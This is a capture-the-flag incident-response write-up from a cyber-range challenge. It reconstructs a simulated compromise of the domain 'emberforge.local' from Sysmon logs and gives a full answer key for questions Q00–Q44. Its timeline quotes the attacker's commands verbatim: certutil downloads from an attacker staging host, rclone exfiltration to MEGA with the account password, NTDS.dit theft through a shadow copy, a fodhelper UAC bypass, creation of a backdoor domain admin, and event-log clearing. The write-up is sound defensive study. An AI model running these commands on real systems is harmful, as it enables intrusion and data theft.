# EmberForge // Source Leak — Incident Report & CTF Writeup

**Challenge:** EmberForge // Source Leak  
**Platform:** LOG(N) Pacific Cyber Range (Skool)  
**Analyst:** Rich Vincent  
**Date Completed:** 2026-04-04  
**Data Source:** `EmberForgeX_CL` (Sysmon + Windows Security events, 18,250 rows)  
**Sentinel Workspace:** `LAW-Cyber-Range` — `60c7f53e-249a-4077-b68e-55a4ae877d7c`

---

## Executive Summary

A threat actor compromised the `emberforge.local` domain through a phishing-delivered ISO file, achieving full domain compromise in a single attack session. The attacker exfiltrated the entire `C:\GameDev` source code repository (42.3 GB) to MEGA cloud storage using the credential `jwilson.vhr@proton.me` / `Summer2024!`. Domain credentials were stolen via NTDS.dit extraction from a VSS shadow copy on the Domain Controller. The attacker established persistent remote access via AnyDesk and created a backdoor domain admin account (`svc_backup`). Security and System event logs on the DC were subsequently cleared to impede forensic investigation — however, Sysmon telemetry survived the clearing and provides near-complete reconstruction of the attack chain.

**Three hosts compromised:**
| Hostname | Role | OS |
|---|---|---|
| EC2AMAZ-B9GHHO6 | Lisa Martin's workstation | Windows 10 |
| EC2AMAZ-16V3AU4 | Internal file/app server | Windows Server |
| EC2AMAZ-EEU3IA2 | Domain Controller | Windows Server |

---

## MITRE ATT&CK Kill Chain

| Phase | Technique | ID |
|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 |
| Initial Access | Mark-of-the-Web Bypass via ISO | T1553.005 |
| Execution | Rundll32 DLL Execution | T1218.011 |
| Execution | Command and Scripting Interpreter | T1059.003 |
| Persistence | Scheduled Task (WindowsUpdate) | T1053.005 |
| Persistence | Remote Access Software (AnyDesk) | T1219 |
| Persistence | Create Account: Domain Account (svc_backup) | T1136.002 |
| Privilege Escalation | Abuse Elevation Control: fodhelper UAC Bypass | T1548.002 |
| Defense Evasion | Process Injection: CreateRemoteThread | T1055.003 |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 |
| Defense Evasion | Masquerading: Scheduled Task Name (WindowsUpdate) | T1036.004 |
| Credential Access | OS Credential Dumping: LSASS (direct syscalls) | T1003.001 |
| Credential Access | OS Credential Dumping: NTDS.dit via VSS | T1003.003 |
| Discovery | Domain Account Discovery | T1087.002 |
| Discovery | Domain Trust Discovery (nltest) | T1482 |
| Lateral Movement | Remote Services: SMB (Impacket smbexec) | T1021.002 |
| Lateral Movement | Scheduled Task/Job: atexec | T1053.005 |
| Collection | Archive Collected Data: Compress-Archive | T1560.001 |
| Exfiltration | Exfiltration to Cloud Storage (MEGA/rclone) | T1567.002 |
| Command & Control | Application Layer Protocol: HTTPS | T1071.001 |
| Command & Control | Domain Fronting / Cloudflare CDN | T1090.004 |

---

## Attack Timeline

All times are extracted from Sysmon/Windows event XML (`SystemTime`). Sentinel ingestion timestamps are unreliable (all events ingested ~22:35–22:44 UTC).

### Phase 1 — Initial Access (EC2AMAZ-B9GHHO6)

**User:** `EMBERFORGE\lmartin` (Lisa Martin)

1. Lisa opens `EmberForge_Review.iso` — Windows mounts it as drive `D:`, bypassing Mark-of-the-Web (no Zone.Identifier ADS propagation from ISO containers).
2. The ISO contains `review.dll`.

**Execution:**
```
explorer.exe
  └─ rundll32.exe D:\review.dll,StartW     [EventCode 1, lmartin context]
       └─ notepad.exe                        [EventCode 8 - CreateRemoteThread injection]
```

- `review.dll` injects a shellcode stub into `notepad.exe` (initial medium-integrity beachhead).
- `notepad.exe` downloads and drops `C:\Users\Public\update.exe` (primary C2 implant).

### Phase 2 — C2 Establishment & UAC Bypass (EC2AMAZ-B9GHHO6)

**C2 Domain:** `cdn.cloud-endpoint.net`  
**C2 IPs:** `104.21.30.237` (primary), `172.67.174.46` (secondary) — both Cloudflare, same origin  
**Protocol:** HTTPS (port 443)

`update.exe` establishes persistent C2 beaconing. The attacker then escalates privileges:

**fodhelper UAC Bypass:**
```
update.exe writes registry:
  HKU\..._Classes\ms-settings\shell\open\command\(Default) = update.exe
  HKU\..._Classes\ms-settings\shell\open\command\DelegateExecute = (empty)

cmd.exe /c fodhelper.exe   →   fodhelper.exe spawns update.exe at HIGH integrity
```

**Post-escalation stable injection:**
```
update.exe (HIGH)
  └─ spoolsv.exe            [CreateRemoteThread — elevated, SYSTEM context]
```

**Persistence (workstation):**
```
schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system
```
The task name `WindowsUpdate` masquerades as a legitimate Windows update mechanism.

### Phase 3 — Credential Dumping & Discovery (EC2AMAZ-B9GHHO6)

**LSASS Dump:**
- `update.exe` dumps LSASS using direct syscalls (bypassing userland EDR hooks)
- Output: `C:\Windows\System32\lsass.dmp`

**Domain Reconnaissance (all via elevated update.exe/spoolsv.exe):**
```
net user /domain
net group "Domain Admins" /domain
nltest /dclist:emberforge.local
```

**Firewall Rule Added:**
```
netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445
```
Enables inbound SMB for tool staging share access.

### Phase 4 — Lateral Movement to Server (EC2AMAZ-16V3AU4)

**Tool Staging (from workstation):**
- Attacker shares tools via `\\10.1.173.145\tools` (SMB share on workstation)
- Server pulls payload: `copy \\10.1.173.145\tools\update.exe C:\Users\Public\update.exe`

**Alternative staging (LOLBin):**
```
certutil.exe -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
certutil.exe -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\Users\Public\AnyDesk.exe
```

**Staging server:** `sync.cloud-endpoint.net:8080` (HTTP, attacker-controlled)

**Failed Lateral Movement Attempt:**
- Attacker attempted NTLM pass-the-hash from workstation (10.1.173.145) to server
- 4625 events with status `0x80090308` (NTLM invalid signature) — hash was unusable
- Attacker pivoted to Impacket **smbexec** instead

**Impacket smbexec on server — First Command:**
```
whoami
```
Confirmed execution context before proceeding.

### Phase 5 — Exfiltration (EC2AMAZ-16V3AU4)

**Archive creation:**
```powershell
Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip
```

**rclone configuration built line-by-line (to avoid writing full config to disk at once):**
```
echo [mega]>> C:\Users\Public\rclone.conf
echo type = mega>> C:\Users\Public\rclone.conf
echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf
echo pass = 1PS7P86ziG00iZmuq5XFbyEXKkkB8ClOiwBY>> C:\Users\Public\rclone.conf
```

The rclone-obfuscated password was generated via:
```
rclone.exe obscure Summer2024!   →   1PS7P86ziG00iZmuq5XFbyEXKkkB8ClOiwBY
```

**Exfil commands:**
```
rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v
rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

**Attacker credentials exposed in plaintext:**
- MEGA account: `jwilson.vhr@proton.me`
- MEGA password: `Summer2024!`

### Phase 6 — Lateral Movement to Domain Controller (EC2AMAZ-EEU3IA2)

**Impacket atexec — First Command on DC:**

The very first attacker command on the DC was a validation check via atexec (scheduled task execution):
```
whoami                 [23:19:21 UTC - atexec random scheduled task]
```

Confirmed SYSTEM execution on DC, then pivoted to smbexec for heavier operations.

**Impacket smbexec on DC — NTDS Extraction via VSS:**

Random-named services (7045 events) executed the following sequence:
```
vssadmin list shadows /for=C:                              [service: zgECPPnE]
vssadmin create shadow /For=C:                             [service: JKEpKhcH]
vssadmin list shadows /for=C:                              [service: ROeVQtpt]
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
      %SYSTEMROOT%\Temp\nyMdRNSp.tmp                       [service: fHxLXpku]
vssadmin delete shadows /shadow="{0ed56514-...}" /Quiet    [service: YOzedHWI]
```

`ntds.dit` copy staged at: `C:\Windows\Temp\nyMdRNSp.tmp`

### Phase 7 — Backdoor Account Creation (EC2AMAZ-EEU3IA2)

```
net user svc_backup P@ssw0rd123! /add /domain
net group "Domain Admins" svc_backup /add /domain
```

**Backdoor account:** `svc_backup` / `P@ssw0rd123!` — added directly to Domain Admins.

### Phase 8 — Remote Access Persistence (EC2AMAZ-B9GHHO6)

**AnyDesk installed silently:**
```
AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
net start AnyDesk
```

**Config modified for unattended access:**
```
cmd.exe /c type C:\ProgramData\AnyDesk\system.conf
cmd.exe /c echo ad.security.interactive_access=2 >> C:\ProgramData\AnyDesk\system.conf
cmd.exe /c echo ad.security.unattended_access_password_hash=5e884898da28047d91089d3f7c6e12d05d0fb9e2 >> C:\ProgramData\AnyDesk\system.conf
```

- `interactive_access=2` — allows unattended connections without user approval
- `5e884898da28047d91089d3f7c6e12d05d0fb9e2` — SHA1 hash of `password`

**AnyDesk unattended password:** `password`

**Config location:** `C:\ProgramData\AnyDesk\system.conf`

### Phase 9 — Anti-Forensics (EC2AMAZ-EEU3IA2)

```
wevtutil cl Security
wevtutil cl System
```

Executed via smbexec (svchost → cmd → wevtutil). The Security and System event logs on the DC were fully wiped, creating gaps in logon event, privilege use, and object access records.

**Evidence Gap Impact:** Logon events (4624/4625), object access (4662), and privilege assignments for the DC cannot be recovered from Windows Event Log. However, Sysmon data on the DC (EventCodes 1, 3, 8, 11, 13, 15) survived as it logs to a separate channel (`Microsoft-Windows-Sysmon/Operational`) and was NOT cleared by the attacker. The full process execution chain on the DC is reconstructable from Sysmon alone.

---

## Evidence Inventory

### Artifacts on EC2AMAZ-B9GHHO6 (Workstation)

| Artifact | Path | Purpose |
|---|---|---|
| ISO delivery | `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\EmberForge_Review.iso` | Phishing delivery, MotW bypass |
| Malicious DLL | `D:\review.dll` | Initial execution via rundll32 |
| C2 implant | `C:\Users\Public\update.exe` | Primary C2 beacon |
| LSASS dump | `C:\Windows\System32\lsass.dmp` | Credential harvesting |
| AnyDesk installer | `C:\Users\Public\AnyDesk.exe` | Staged via certutil |
| AnyDesk installed | `C:\ProgramData\AnyDesk\AnyDesk.exe` | Remote access service |
| AnyDesk config | `C:\ProgramData\AnyDesk\system.conf` | Unattended access config |
| Scheduled task | `C:\Windows\System32\Tasks\WindowsUpdate` | Persistence (`/sc onstart /ru system`) |

### Artifacts on EC2AMAZ-16V3AU4 (Server)

| Artifact | Path | Purpose |
|---|---|---|
| C2 implant | `C:\Users\Public\update.exe` | Lateral movement payload |
| rclone | `C:\Users\Public\rclone.exe` | Exfil tool |
| rclone config | `C:\Users\Public\rclone.conf` | MEGA credentials |
| Archive | `C:\Users\Public\gamedev.zip` | Staged exfil archive |

### Artifacts on EC2AMAZ-EEU3IA2 (Domain Controller)

| Artifact | Path | Purpose |
|---|---|---|
| ntds.dit copy | `C:\Windows\Temp\nyMdRNSp.tmp` | Domain credential theft |
| Smbexec temp bat | `C:\Windows\Temp\execute.bat` | Smbexec execution staging (transient) |

### Network Indicators of Compromise

| Indicator | Type | Purpose |
|---|---|---|
| `cdn.cloud-endpoint.net` | C2 domain | Primary C2 (Cloudflare-fronted) |
| `sync.cloud-endpoint.net` | Staging domain | Payload delivery (port 8080 HTTP) |
| `104.21.30.237` | C2 IP | Primary C2 endpoint |
| `172.67.174.46` | C2 IP | Secondary C2 endpoint |
| `jwilson.vhr@proton.me` | Attacker email | MEGA exfil account |
| `Summer2024!` | Credential | MEGA password (exposed in rclone args) |

### Compromised Domain Credentials

| Account | Password | Source | Privilege |
|---|---|---|---|
| `svc_backup` | `P@ssw0rd123!` | Attacker-created | Domain Admin |
| `jwilson.vhr@proton.me` | `Summer2024!` | Attacker MEGA account | N/A |
| All domain accounts | (via ntds.dit) | NTDS.dit extraction | All |

---

## Answers Reference (Q00–Q44)

| Q# | Topic | Answer |
|---|---|---|
| Q00 | Custom log table | `EmberForgeX_CL` |
| Q01 | Exfil source directory | `C:\GameDev` |
| Q02 | Cloud provider | MEGA |
| Q03 | Attacker email | `jwilson.vhr@proton.me` |
| Q04 | Domain credential file | `ntds.dit` |
| Q05 | Exfil tool | `rclone.exe` |
| Q06 | Exfil destination IP | *(MEGA cloud IP)* |
| Q07 | Plaintext MEGA password | `Summer2024!` |
| Q08 | Archive cmdlet | `Compress-Archive` |
| Q09 | Staging server | `sync.cloud-endpoint.net` |
| Q10 | Earliest malicious process | `review.dll` |
| Q11 | Delivery drive letter | `D:` |
| Q12 | Compromised user | `lmartin` |
| Q13 | Execution chain | `explorer.exe > rundll32.exe > review.dll` |
| Q14 | Delivery unpacking | `rundll32.exe > C:\Users\Public\` |
| Q15 | Dropped payload path | `C:\Users\Public\update.exe` |
| Q16 | C2 domain | `cdn.cloud-endpoint.net` |
| Q17 | Primary C2 IP | `104.21.30.237` |
| Q18 | Initial injection chain | `rundll32.exe > notepad.exe` |
| Q19 | UAC bypass binary | `fodhelper.exe` |
| Q20 | Registry bypass value | `DelegateExecute` |
| Q21 | Stable injection chain | `update.exe > spoolsv.exe` |
| Q22 | Credential dumping process | `update.exe` |
| Q23 | LSASS dump path | `C:\Windows\System32\lsass.dmp` |
| Q24 | User enumeration command | `net user /domain` |
| Q25 | Privilege enumeration command | `net group "Domain Admins" /domain` |
| Q26 | Infrastructure mapping command | `nltest /dclist:emberforge.local` |
| Q27 | Tool staging command | `copy \\10.1.173.145\tools\update.exe C:\Users\Public\update.exe` |
| Q28 | Firewall rule name | `SMB` |
| Q29 | Post-escalation parent | `fodhelper.exe` |
| Q30 | Beacon distribution command | `certutil.exe -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe` |
| Q31 | LOLBin tool staging | `certutil.exe > http://sync.cloud-endpoint.net:8080/update.exe` |
| Q32 | Smbexec service name | *(random 8-char, case-sensitive)* |
| Q33 | First command on server | `whoami` |
| Q34 | Failed lateral movement protocol | `NTLM` |
| Q35 | DC arrival sequence | `whoami > vssadmin.exe` |
| Q36 | Backdoor account | `svc_backup` |
| Q37 | Backdoor password | `P@ssw0rd123!` |
| Q38 | Privilege group | `Domain Admins` |
| Q39 | Exposed credential | `Summer2024!` |
| Q40 | Scheduled task (flag) | `WindowsUpdate` |
| Q41 | Remote access tool | `AnyDesk` |
| Q42 | Remote access config path | `C:\ProgramData\AnyDesk\system.conf` |
| Q43 | Anti-forensics tool | `wevtutil` |
| Q44 | Cleared event logs | `Security, System` |

---

## Evidence Gaps & Limitations

The attacker used `wevtutil cl Security` and `wevtutil cl System` on the DC, creating gaps in:

- **Windows Security log (DC):** Logon events (4624/4625), Kerberos (4768/4769), privilege use, object access (4662), account management events (4720/4732/4756)
- **Windows System log (DC):** Service control events (7036) and other system records outside the attack window

**What survived:** Sysmon telemetry on all three hosts (separate channel, not cleared) provides complete process execution, network connection, file creation, and registry modification records. The attack chain is fully reconstructable despite the log clearing.

---

## Recommendations

### Immediate (Incident Response)

1. **Rotate all domain credentials** — ntds.dit was exfiltrated; all password hashes are compromised
2. **Disable/delete `svc_backup`** domain admin account
3. **Revoke MEGA access** for `jwilson.vhr@proton.me` and report to MEGA abuse team
4. **Remove AnyDesk service** from EC2AMAZ-B9GHHO6 and invalidate all AnyDesk IDs
5. **Delete `WindowsUpdate` scheduled task** and remove `update.exe` from Public folder
6. **Block C2 domains/IPs:** `cdn.cloud-endpoint.net`, `sync.cloud-endpoint.net`, `104.21.30.237`, `172.67.174.46`
7. **Reset KRBTGT account** twice (24-hour gap) to invalidate any forged Kerberos tickets

### Detection Improvements

1. **Alert on `wevtutil cl`** — no legitimate admin use case for clearing Security/System logs in bulk
2. **Alert on ISO/IMG mounts by end users** — primary MotW bypass vector
3. **Alert on `rundll32.exe` loading DLLs from removable/mounted drives**
4. **Alert on `fodhelper.exe` spawning child processes** (UAC bypass indicator)
5. **Alert on `certutil -urlcache`** downloading executables
6. **Alert on rclone/cloud sync tools** on servers and workstations
7. **Monitor for Impacket signatures:** random 8-char service names (7045), atexec temp file patterns (`__output_*`, `.bat` in `C:\Windows\`)
8. **Alert on `vssadmin create shadow`** followed by ntds.dit access

### Hardening

1. **Disable ISO autoplay** via GPO (`NoDriveTypeAutoRun`)
2. **Enforce application allowlisting** (WDAC/AppLocker) — block unsigned DLLs from user directories
3. **Enable Credential Guard** — prevents LSASS memory access even with direct syscalls
4. **Enable Protected Users** security group for all privileged accounts
5. **Restrict scheduled task creation** to administrators via GPO
6. **Deploy Sysmon** on all hosts (already deployed here — it saved this investigation)
7. **Enable Tamper Protection** on Sysmon to prevent log clearing of its channel
8. **Disable Password Authentication** for RDP and SSH where possible
9. **Implement LAPS** for local admin accounts to prevent lateral movement via shared credentials

---

## Key Investigative Lesson: Sentinel Ingestion vs. Event Time

All 18,250 events in `EmberForgeX_CL` have nearly identical `TimeGenerated` values (batch-ingested ~22:35–22:44 UTC). **Do not use `TimeGenerated` for attack sequencing.** Actual event times are embedded in the Sysmon/Windows XML in `Raw_s`:

```xml
<TimeCreated SystemTime='2026-01-30T23:19:21.XXXXXXX'/>
```

This distinction was critical for Q35 (DC Arrival): the atexec `whoami` at `23:19:21` preceded the smbexec `vssadmin` operations at `23:34:55` — a 15-minute gap invisible from `TimeGenerated` alone. Always extract real event times from `Raw_s` when sequencing events.
